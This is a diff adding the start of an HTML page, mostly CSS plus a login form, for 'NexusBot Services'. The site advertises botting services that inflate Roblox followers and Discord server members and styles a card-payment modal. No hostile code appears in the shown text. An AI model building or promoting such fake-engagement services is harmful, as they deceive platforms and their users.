@@ -1,0 +1,2468 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Professional gaming services platform - Boost your Roblox followers, Discord server members, and enhance your gaming experience with our premium botting services.">
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>N</text></svg>" type="image/svg+xml">
+    <title>NexusBot Services - Professional Gaming Enhancement Platform</title>
+    <style>
+        :root {
+            --primary: #6366f1;
+            --primary-dark: #4f46e5;
+            --primary-light: #818cf8;
+            --secondary: #8b5cf6;
+            --secondary-dark: #7c3aed;
+            --background: #0f172a;
+            --surface: #1e293b;
+            --surface-light: #334155;
+            --surface-lighter: #475569;
+            --text: #f1f5f9;
+            --text-secondary: #94a3b8;
+            --text-muted: #64748b;
+            --border: #475569;
+            --success: #10b981;
+            --error: #ef4444;
+            --warning: #f59e0b;
+            --gradient-primary: linear-gradient(135deg, #6366f1 0%, #8b5cf6 100%);
+            --gradient-secondary: linear-gradient(135deg, #8b5cf6 0%, #a855f7 100%);
+            --shadow-sm: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
+            --shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+            --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
+            --shadow-xl: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: var(--background);
+            color: var(--text);
+            min-height: 100vh;
+            transition: background 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            overflow-x: hidden;
+        }
+
+        body.light-mode {
+            --background: #f8fafc;
+            --surface: #ffffff;
+            --surface-light: #e2e8f0;
+            --surface-lighter: #cbd5e1;
+            --text: #1e293b;
+            --text-secondary: #64748b;
+            --text-muted: #94a3b8;
+            --border: #e2e8f0;
+        }
+
+        
+        html {
+            scroll-behavior: smooth;
+        }
+
+       
+        .auth-container {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            background: linear-gradient(135deg, var(--background) 0%, var(--surface) 50%, var(--surface-light) 100%);
+            background-size: 400% 400%;
+            animation: gradientBG 15s ease infinite;
+        }
+
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .auth-box {
+            background: var(--surface);
+            padding: 48px;
+            border-radius: 24px;
+            width: 100%;
+            max-width: 460px;
+            box-shadow: var(--shadow-xl);
+            border: 1px solid var(--border);
+            backdrop-filter: blur(10px);
+            transform: translateY(0);
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .auth-box:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 25px 50px -12px rgba(99, 102, 241, 0.25);
+        }
+
+        .auth-header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .auth-header h1 {
+            font-size: 32px;
+            font-weight: 800;
+            background: var(--gradient-primary);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 12px;
+        }
+
+        .auth-header p {
+            color: var(--text-secondary);
+            font-size: 15px;
+            font-weight: 400;
+        }
+
+        .auth-tabs {
+            display: flex;
+            margin-bottom: 32px;
+            background: var(--background);
+            padding: 4px;
+            border-radius: 12px;
+            border: 1px solid var(--border);
+        }
+
+        .auth-tab {
+            flex: 1;
+            padding: 14px;
+            text-align: center;
+            cursor: pointer;
+            font-weight: 600;
+            color: var(--text-secondary);
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            border: none;
+            background: transparent;
+            font-size: 14px;
+            border-radius: 8px;
+        }
+
+        .auth-tab.active {
+            background: var(--gradient-primary);
+            color: white;
+            box-shadow: var(--shadow-md);
+        }
+
+        .auth-tab:hover:not(.active) {
+            color: var(--text);
+            background: var(--surface-light);
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+            position: relative;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--text);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .form-group input,
+        .form-group textarea,
+        .form-group select {
+            width: 100%;
+            padding: 16px 20px;
+            border: 2px solid var(--border);
+            border-radius: 12px;
+            background: var(--background);
+            color: var(--text);
+            font-size: 15px;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            font-family: inherit;
+        }
+
+        .form-group input:focus,
+        .form-group textarea:focus,
+        .form-group select:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 4px rgba(99, 102, 241, 0.1);
+        }
+
+        .form-group input::placeholder,
+        .form-group textarea::placeholder {
+            color: var(--text-muted);
+        }
+
+        .form-group input.error {
+            border-color: var(--error);
+            animation: shake 0.5s ease-in-out;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+
+        .error-tooltip {
+            position: absolute;
+            top: calc(100% + 8px);
+            left: 0;
+            background: var(--error);
+            color: white;
+            padding: 10px 14px;
+            border-radius: 8px;
+            font-size: 12px;
+            font-weight: 500;
+            display: none;
+            z-index: 100;
+            animation: slideDown 0.3s ease-out;
+            box-shadow: var(--shadow-lg);
+        }
+
+        @keyframes slideDown {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .error-tooltip::after {
+            content: '';
+            position: absolute;
+            top: -6px;
+            left: 20px;
+            width: 0;
+            height: 0;
+            border-left: 6px solid transparent;
+            border-right: 6px solid transparent;
+            border-bottom: 6px solid var(--error);
+        }
+
+        .btn-primary {
+            width: 100%;
+            padding: 16px;
+            background: var(--gradient-primary);
+            border: none;
+            border-radius: 12px;
+            color: white;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-primary::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.5s ease;
+        }
+
+        .btn-primary:hover::before {
+            left: 100%;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 30px -10px rgba(99, 102, 241, 0.5);
+        }
+
+        .btn-primary:active {
+            transform: translateY(0);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .auth-footer {
+            margin-top: 28px;
+            text-align: center;
+            font-size: 14px;
+            color: var(--text-secondary);
+        }
+
+        .auth-footer a {
+            color: var(--primary);
+            text-decoration: none;
+            font-weight: 700;
+            cursor: pointer;
+            transition: color 0.3s ease;
+        }
+
+        .auth-footer a:hover {
+            color: var(--primary-light);
+            text-decoration: underline;
+        }
+
+        .message-box {
+            background: var(--background);
+            border: 2px solid var(--border);
+            padding: 14px 18px;
+            border-radius: 12px;
+            margin-bottom: 24px;
+            font-size: 14px;
+            display: none;
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .message-box.error {
+            border-color: var(--error);
+            background: rgba(239, 68, 68, 0.1);
+            color: var(--error);
+        }
+
+        .message-box.success {
+            border-color: var(--success);
+            background: rgba(16, 185, 129, 0.1);
+            color: var(--success);
+        }
+
+
+        .loading-spinner {
+            width: 24px;
+            height: 24px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            display: none;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .btn-loading .loading-spinner {
+            display: block;
+        }
+
+        .btn-loading .btn-text {
+            display: none;
+        }
+
+        
+        .main-container {
+            display: none;
+            opacity: 0;
+            animation: fadeInPage 0.6s ease-out forwards;
+        }
+
+        @keyframes fadeInPage {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .main-container.active {
+            display: block;
+        }
+
+       
+        .navbar {
+            background: var(--surface);
+            border-bottom: 1px solid var(--border);
+            padding: 0 24px;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            backdrop-filter: blur(10px);
+            box-shadow: var(--shadow-sm);
+        }
+
+        .navbar-content {
+            max-width: 1400px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            height: 72px;
+        }
+
+        .logo {
+            font-size: 26px;
+            font-weight: 900;
+            background: var(--gradient-primary);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            cursor: pointer;
+            transition: transform 0.3s ease;
+        }
+
+        .logo:hover {
+            transform: scale(1.05);
+        }
+
+        .nav-tabs {
+            display: flex;
+            gap: 4px;
+            background: var(--background);
+            padding: 4px;
+            border-radius: 12px;
+            border: 1px solid var(--border);
+        }
+
+        .nav-tab {
+            padding: 10px 18px;
+            border: none;
+            background: transparent;
+            color: var(--text-secondary);
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            border-radius: 8px;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .nav-tab:hover {
+            background: var(--surface-light);
+            color: var(--text);
+        }
+
+        .nav-tab.active {
+            background: var(--gradient-primary);
+            color: white;
+            box-shadow: var(--shadow-sm);
+        }
+
+        .nav-actions {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .user-avatar {
+            width: 42px;
+            height: 42px;
+            border-radius: 50%;
+            background: var(--gradient-primary);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-weight: 700;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: 2px solid var(--surface-light);
+        }
+
+        .user-avatar:hover {
+            transform: scale(1.1);
+            box-shadow: 0 0 20px rgba(99, 102, 241, 0.4);
+        }
+
+        
+        .mobile-menu-btn {
+            display: none;
+            background: none;
+            border: none;
+            color: var(--text);
+            font-size: 24px;
+            cursor: pointer;
+            padding: 8px;
+        }
+
+        
+        .content-area {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 40px 24px;
+        }
+
+        .tab-content {
+            display: none;
+            animation: fadeInTab 0.4s ease-out;
+        }
+
+        @keyframes fadeInTab {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+       
+        .hero-section {
+            text-align: center;
+            padding: 80px 40px;
+            background: linear-gradient(135deg, var(--surface) 0%, var(--background) 100%);
+            border-radius: 24px;
+            margin-bottom: 48px;
+            border: 1px solid var(--border);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .hero-section::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(99, 102, 241, 0.1) 0%, transparent 50%);
+            animation: pulse 15s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+
+        .hero-section h1 {
+            font-size: 52px;
+            font-weight: 900;
+            margin-bottom: 20px;
+            background: var(--gradient-primary);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            position: relative;
+            z-index: 1;
+        }
+
+        .hero-section p {
+            font-size: 18px;
+            color: var(--text-secondary);
+            max-width: 650px;
+            margin: 0 auto 40px;
+            line-height: 1.6;
+            position: relative;
+            z-index: 1;
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 24px;
+            margin-top: 48px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .stat-card {
+            background: var(--background);
+            padding: 28px;
+            border-radius: 16px;
+            text-align: center;
+            border: 1px solid var(--border);
+            transition: all 0.3s ease;
+        }
+
+        .stat-card:hover {
+            transform: translateY(-8px);
+            box-shadow: var(--shadow-lg);
+            border-color: var(--primary);
+        }
+
+        .stat-card h3 {
+            font-size: 36px;
+            font-weight: 800;
+            color: var(--primary);
+            margin-bottom: 8px;
+        }
+
+        .stat-card p {
+            font-size: 13px;
+            color: var(--text-secondary);
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        
+        .services-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(340px, 1fr));
+            gap: 28px;
+            margin-top: 40px;
+        }
+
+        .service-card {
+            background: var(--surface);
+            border-radius: 20px;
+            padding: 32px;
+            border: 1px solid var(--border);
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .service-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: var(--gradient-primary);
+            transform: scaleX(0);
+            transition: transform 0.4s ease;
+        }
+
+        .service-card:hover::before {
+            transform: scaleX(1);
+        }
+
+        .service-card:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+            border-color: var(--primary-light);
+        }
+
+        .service-icon {
+            width: 64px;
+            height: 64px;
+            background: var(--gradient-primary);
+            border-radius: 16px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 28px;
+            font-weight: 800;
+            margin-bottom: 20px;
+            color: white;
+            box-shadow: var(--shadow-lg);
+        }
+
+        .service-card h3 {
+            font-size: 22px;
+            font-weight: 800;
+            margin-bottom: 12px;
+            color: var(--text);
+        }
+
+        .service-card p {
+            color: var(--text-secondary);
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+
+        .price-tag {
+            font-size: 32px;
+            font-weight: 800;
+            color: var(--primary);
+            margin-bottom: 20px;
+        }
+
+        .price-tag span {
+            font-size: 14px;
+            color: var(--text-secondary);
+            font-weight: 500;
+        }
+
+        .purchase-btn {
+            width: 100%;
+            padding: 14px;
+            background: var(--gradient-primary);
+            border: none;
+            border-radius: 12px;
+            color: white;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .purchase-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px -10px rgba(99, 102, 241, 0.6);
+            background: var(--gradient-secondary);
+        }
+
+       
+        .profile-header {
+            background: linear-gradient(135deg, var(--surface) 0%, var(--background) 100%);
+            border-radius: 24px;
+            overflow: hidden;
+            margin-bottom: 28px;
+            border: 1px solid var(--border);
+        }
+
+        .profile-banner {
+            height: 180px;
+            background: var(--gradient-primary);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .profile-banner-input {
+            position: absolute;
+            top: 16px;
+            right: 16px;
+            padding: 10px 20px;
+            background: rgba(0, 0, 0, 0.6);
+            border: 2px solid rgba(255, 255, 255, 0.2);
+            border-radius: 8px;
+            color: white;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            backdrop-filter: blur(10px);
+        }
+
+        .profile-banner-input:hover {
+            background: rgba(0, 0, 0, 0.8);
+            transform: translateY(-2px);
+        }
+
+        .profile-info {
+            display: flex;
+            align-items: flex-end;
+            padding: 0 32px;
+            margin-top: -60px;
+            position: relative;
+        }
+
+        .profile-picture {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            background: var(--surface-light);
+            border: 5px solid var(--surface);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 40px;
+            font-weight: 800;
+            position: relative;
+            overflow: hidden;
+            box-shadow: var(--shadow-lg);
+        }
+
+        .profile-picture img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .profile-picture-input {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            padding: 8px;
+            background: rgba(0, 0, 0, 0.8);
+            border: none;
+            color: white;
+            font-size: 10px;
+            cursor: pointer;
+            text-align: center;
+            font-weight: 600;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .profile-picture:hover .profile-picture-input {
+            opacity: 1;
+        }
+
+        .profile-details {
+            margin-left: 24px;
+            flex: 1;
+            padding-bottom: 20px;
+        }
+
+        .profile-username {
+            font-size: 32px;
+            font-weight: 800;
+            margin-bottom: 6px;
+            color: var(--text);
+        }
+
+        .profile-email {
+            color: var(--text-secondary);
+            font-size: 15px;
+            font-weight: 500;
+        }
+
+        .profile-section {
+            background: var(--surface);
+            border-radius: 20px;
+            padding: 32px;
+            margin-top: 24px;
+            border: 1px solid var(--border);
+        }
+
+        .profile-section h3 {
+            font-size: 20px;
+            font-weight: 800;
+            margin-bottom: 24px;
+            color: var(--text);
+        }
+
+        .profile-section textarea {
+            width: 100%;
+            min-height: 120px;
+            padding: 16px;
+            border: 2px solid var(--border);
+            border-radius: 12px;
+            background: var(--background);
+            color: var(--text);
+            font-size: 15px;
+            resize: vertical;
+            font-family: inherit;
+            line-height: 1.6;
+        }
+
+        .save-profile-btn {
+            margin-top: 20px;
+            padding: 14px 28px;
+            background: var(--gradient-primary);
+            border: none;
+            border-radius: 12px;
+            color: white;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .save-profile-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px -10px rgba(99, 102, 241, 0.5);
+        }
+
+        
+        .settings-section {
+            background: var(--surface);
+            border-radius: 20px;
+            padding: 32px;
+            margin-bottom: 28px;
+            border: 1px solid var(--border);
+        }
+
+        .settings-section h3 {
+            font-size: 20px;
+            font-weight: 800;
+            margin-bottom: 24px;
+            color: var(--text);
+        }
+
+        .setting-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+            border-bottom: 1px solid var(--border);
+            transition: background 0.3s ease;
+        }
+
+        .setting-item:last-child {
+            border-bottom: none;
+        }
+
+        .setting-item:hover {
+            background: var(--background);
+            margin: 0 -16px;
+            padding: 20px 16px;
+            border-radius: 12px;
+        }
+
+        .setting-label {
+            flex: 1;
+        }
+
+        .setting-label h4 {
+            font-size: 16px;
+            font-weight: 700;
+            margin-bottom: 6px;
+            color: var(--text);
+        }
+
+        .setting-label p {
+            font-size: 13px;
+            color: var(--text-secondary);
+        }
+
+        .toggle-switch {
+            width: 52px;
+            height: 28px;
+            background: var(--surface-light);
+            border-radius: 14px;
+            position: relative;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .toggle-switch.active {
+            background: var(--primary);
+            box-shadow: 0 0 15px rgba(99, 102, 241, 0.4);
+        }
+
+        .toggle-switch::after {
+            content: '';
+            position: absolute;
+            width: 22px;
+            height: 22px;
+            background: white;
+            border-radius: 50%;
+            top: 3px;
+            left: 3px;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            box-shadow: var(--shadow-sm);
+        }
+
+        .toggle-switch.active::after {
+            left: 27px;
+        }
+
+       
+        .faq-container {
+            background: var(--surface);
+            border-radius: 20px;
+            padding: 32px;
+            border: 1px solid var(--border);
+        }
+
+        .faq-item {
+            border-bottom: 1px solid var(--border);
+            padding: 24px 0;
+        }
+
+        .faq-item:last-child {
+            border-bottom: none;
+        }
+
+        .faq-question {
+            font-size: 16px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            color: var(--text);
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .faq-question::after {
+            content: '+';
+            font-size: 24px;
+            color: var(--primary);
+            transition: transform 0.3s ease;
+        }
+
+        .faq-item.open .faq-question::after {
+            transform: rotate(45deg);
+        }
+
+        .faq-answer {
+            color: var(--text-secondary);
+            font-size: 14px;
+            line-height: 1.6;
+            display: none;
+            padding-top: 12px;
+        }
+
+        .faq-item.open .faq-answer {
+            display: block;
+            animation: slideDown 0.3s ease-out;
+        }
+
+        /* Support Section */
+        .support-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 24px;
+        }
+
+        .support-card {
+            background: var(--surface);
+            padding: 32px;
+            border-radius: 20px;
+            border: 1px solid var(--border);
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+
+        .support-card:hover {
+            transform: translateY(-4px);
+            box-shadow: var(--shadow-lg);
+        }
+
+        .support-card h3 {
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            color: var(--text);
+        }
+
+        .support-card p {
+            color: var(--text-secondary);
+            font-size: 14px;
+            line-height: 1.6;
+        }
+
+        /* Modal */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(5px);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        .modal-overlay.active {
+            display: flex;
+        }
+
+        .modal {
+            background: var(--surface);
+            border-radius: 24px;
+            padding: 40px;
+            width: 90%;
+            max-width: 500px;
+            max-height: 90vh;
+            overflow-y: auto;
+            border: 1px solid var(--border);
+            box-shadow: var(--shadow-xl);
+            animation: slideUp 0.4s ease-out;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 32px;
+        }
+
+        .modal-header h2 {
+            font-size: 24px;
+            font-weight: 800;
+            background: var(--gradient-primary);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .modal-close {
+            background: none;
+            border: none;
+            color: var(--text-secondary);
+            font-size: 28px;
+            cursor: pointer;
+            padding: 8px;
+            transition: all 0.3s ease;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-close:hover {
+            background: var(--background);
+            color: var(--text);
+            transform: rotate(90deg);
+        }
+
+        .card-form {
+            display: grid;
+            gap: 20px;
+        }
+
+        .card-preview {
+            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
+            border-radius: 16px;
+            padding: 24px;
+            color: white;
+            margin-bottom: 24px;
+            box-shadow: var(--shadow-lg);
+        }
+
+        .card-preview h4 {
+            font-size: 12px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            opacity: 0.8;
+            text-transform: uppercase;
+        }
+
+        .card-preview .preview-number {
+            font-size: 22px;
+            font-weight: 700;
+            letter-spacing: 2px;
+            margin-bottom: 16px;
+        }
+
+        .card-preview .preview-details {
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .card-preview .preview-details div {
+            text-align: left;
+        }
+
+        .card-preview .preview-details h5 {
+            font-size: 10px;
+            font-weight: 600;
+            opacity: 0.8;
+            margin-bottom: 4px;
+        }
+
+        .card-preview .preview-details p {
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .card-number-input {
+            grid-column: 1 / -1;
+        }
+
+        .card-expiry-input,
+        .card-cvc-input {
+            grid-column: span 1;
+        }
+
+        .total-amount {
+            background: var(--background);
+            padding: 20px;
+            border-radius: 12px;
+            text-align: center;
+            margin-top: 20px;
+            border: 1px solid var(--border);
+        }
+
+        .total-amount h4 {
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--text-secondary);
+            margin-bottom: 8px;
+        }
+
+        .total-amount .amount {
+            font-size: 42px;
+            font-weight: 900;
+            color: var(--primary);
+        }
+
+       
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(15, 23, 42, 0.95);
+            backdrop-filter: blur(10px);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 3000;
+        }
+
+        .loading-overlay.active {
+            display: flex;
+        }
+
+        .loader {
+            width: 80px;
+            height: 80px;
+            border: 4px solid var(--surface-light);
+            border-top-color: var(--primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        .loading-text {
+            position: absolute;
+            margin-top: 120px;
+            color: var(--text);
+            font-size: 16px;
+            font-weight: 600;
+        }
+
+        
+        .purchase-confirmation {
+            text-align: center;
+            padding: 48px 32px;
+        }
+
+        .purchase-confirmation .success-icon {
+            width: 80px;
+            height: 80px;
+            background: var(--success);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 24px;
+            animation: scaleIn 0.5s ease-out;
+        }
+
+        @keyframes scaleIn {
+            from { transform: scale(0); }
+            to { transform: scale(1); }
+        }
+
+        .purchase-confirmation .success-icon::after {
+            content: '✓';
+            color: white;
+            font-size: 40px;
+            font-weight: 800;
+        }
+
+        .purchase-confirmation h2 {
+            font-size: 28px;
+            font-weight: 800;
+            margin-bottom: 16px;
+            color: var(--success);
+        }
+
+        .purchase-confirmation p {
+            color: var(--text-secondary);
+            font-size: 15px;
+            line-height: 1.6;
+            margin-bottom: 8px;
+        }
+
+        
+        .username-change-section {
+            background: var(--background);
+            padding: 20px;
+            border-radius: 12px;
+            margin-top: 16px;
+            border: 1px solid var(--border);
+        }
+
+        .cooldown-info {
+            color: var(--warning);
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 16px;
+        }
+
+        
+        @media (max-width: 1024px) {
+            .navbar-content {
+                flex-wrap: wrap;
+                height: auto;
+                padding: 16px;
+            }
+
+            .nav-tabs {
+                width: 100%;
+                overflow-x: auto;
+                margin-top: 16px;
+                padding-bottom: 4px;
+            }
+
+            .nav-tab {
+                white-space: nowrap;
+            }
+
+            .hero-section h1 {
+                font-size: 40px;
+            }
+
+            .services-grid {
+                grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            }
+        }
+
+        @media (max-width: 768px) {
+            .auth-box {
+                padding: 32px 24px;
+                border-radius: 16px;
+            }
+
+            .hero-section {
+                padding: 48px 24px;
+                border-radius: 16px;
+            }
+
+            .hero-section h1 {
+                font-size: 32px;
+            }
+
+            .hero-section p {
+                font-size: 16px;
+            }
+
+            .stats-grid {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 16px;
+            }
+
+            .services-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .profile-info {
+                flex-direction: column;
+                align-items: center;
+                text-align: center;
+                margin-top: -80px;
+            }
+
+            .profile-picture {
+                width: 100px;
+                height: 100px;
+            }
+
+            .profile-details {
+                margin-left: 0;
+                margin-top: 16px;
+            }
+
+            .profile-username {
+                font-size: 24px;
+            }
+
+            .mobile-menu-btn {
+                display: block;
+            }
+
+            .nav-tabs {
+                display: none;
+                flex-direction: column;
+                position: absolute;
+                top: 72px;
+                left: 0;
+                right: 0;
+                background: var(--surface);
+                border-radius: 0;
+                padding: 16px;
+                border-top: 1px solid var(--border);
+            }
+
+            .nav-tabs.active {
+                display: flex;
+            }
+
+            .nav-tab {
+                padding: 14px;
+                text-align: center;
+            }
+
+            .modal {
+                padding: 24px;
+                border-radius: 16px;
+            }
+
+            .content-area {
+                padding: 24px 16px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .stats-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .stat-card h3 {
+                font-size: 28px;
+            }
+
+            .service-card {
+                padding: 24px;
+            }
+
+            .profile-banner {
+                height: 140px;
+            }
+
+            .profile-header {
+                border-radius: 16px;
+            }
+        }
+    </style>
+<script src="..."></script>
+</head>
+<body>
+    
+    <div class="auth-container" id="authContainer">
+        <div class="auth-box">
+            <div class="auth-header">
+                <h1>NexusBot Services</h1>
+                <p>Elevate your gaming experience</p>
+            </div>
+
+            <div class="auth-tabs">
+                <button class="auth-tab active" onclick="switchAuthTab('login')">Login</button>
+                <button class="auth-tab" onclick="switchAuthTab('register')">Register</button>
+            </div>
+
+            <div id="errorMessage" class="message-box error"></div>
+            <div id="successMessage" class="message-box success"></div>
+
+           
+            <form id="loginForm" onsubmit="handleLogin(event)">
+                <div class="form-group">
+                    <label>Username</label>
+                    <input type="text" id="loginUsername" placeholder="Enter your username" required>
+                    <div class="error-tooltip"></div>
+                </div>
+                <div class="form-group">
+                    <label>Password</label>
+                    <input type="password" id="loginPassword" placeholder="Enter your password" required>
+                    <div class="error-tooltip"></div>
+                </div>
+                <button type="submit" class="btn-primary" id="loginBtn">
+                    <span class="btn-text">Login</span>
+                    <div class="loading-spinner"></div>
+                </button>
+                <div class="auth-footer">
+                    Need an account? <a onclick="switchAuthTab('register')">Register here</a>
+                </div>
+            </form>
+
+            
+            <form id="registerForm" onsubmit="handleRegister(event)" style="display: none;">
+                <div class="form-group">
+                    <label>Username</label>
+                    <input type="text" id="registerUsername" placeholder="4-15 characters" minlength="4" maxlength="15" required>
+                    <div class="error-tooltip"></div>
